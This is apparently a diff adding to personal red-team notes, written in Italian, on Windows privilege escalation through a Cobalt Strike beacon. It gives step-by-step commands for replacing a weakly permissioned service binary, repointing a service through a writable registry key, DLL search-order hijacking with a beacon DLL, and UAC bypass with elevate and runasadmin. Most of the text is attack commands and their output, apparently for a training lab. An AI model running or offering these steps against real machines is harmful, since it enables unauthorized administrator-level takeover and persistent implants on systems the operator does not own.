@@ -387,6 +387,76 @@ sc start VulnService3
 connect localhost 4444
 
 
+###Service File Permission
+#se i permessi della cartella sono deboli
+#un servizio di windows viene eseguito tramite binario.exe
+beacon> cacls "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe"
+
+#blocco il servizio
+beacon> sc_stop BadWindowsService
+#sostituisco il file
+beacon> upload C:\Payloads\BadWindowsService.exe
+#riavvio il servizio
+beacon> sc_start BadWindowsService
+
+
+#mostra che gli Autenticated Users hanno fullControl
+Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\BadWindowsService
+#output
+Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\BadWindowsService
+Owner  : BUILTIN\Administrators
+Group  : NT AUTHORITY\SYSTEM
+Access : NT AUTHORITY\Authenticated Users Allow  FullControl
+         BUILTIN\Users Allow  ReadKey
+         BUILTIN\Administrators Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         CREATOR OWNER Allow  FullControl
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
+         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
+         ReadKey
+Audit  : 
+Sddl   : O:BAG:SYD:AI(A;OICI;KA;;;AU)(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)
+         (A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934
+         681)
+
+
+
+#spengo il servizio
+beacon> sc_stop BadWindowsService
+#carico l'exe malevolo
+beacon> sc_config BadWindowsService C:\Path\to\Payload.exe 0 2
+#lo riavvio
+beacon> sc_start BadWindowsService
+
+
+###Dll Search Order Hijacking
+#le app di solito non hanno un path per trovare le dll
+#caricare la dll malevola e piazzarla in una cartella che viene cercata per prima
+
+#controllo che la cartella dove si esegue è scrivibile
+cacls "C:\Program Files\Bad Windows Service\Service Executable"
+# Risultato: Authenticated Users:(CI)(OI)F → utenti normali possono scrivere
+
+#carico la dll malevola
+beacon> cd C:\Program Files\Bad Windows Service\Service Executable
+beacon> upload C:\Payloads\dns_x64.dll
+beacon> mv dns_x64.dll BadDll.dll
+
+#quando il servizio viene avviato parte il beacon
+
+
+
+#User Account Control
+
+#controlla i gruppi, a volte non basta essere local admin
+whoami /groups
+
+#comando elevate
+beacon> elevate
+
+#comando runasadmin
+beacon> runasadmin
+
 
 
 ```
